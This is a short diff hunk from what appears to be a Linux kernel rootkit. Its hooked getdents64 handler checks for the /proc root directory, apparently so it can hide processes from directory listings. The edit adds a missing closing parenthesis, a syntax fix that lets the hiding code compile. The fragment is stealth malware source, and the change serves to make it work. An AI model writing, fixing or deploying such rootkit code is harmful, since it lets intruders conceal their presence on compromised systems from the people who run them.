@@ -110,7 +110,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (offset < ret)
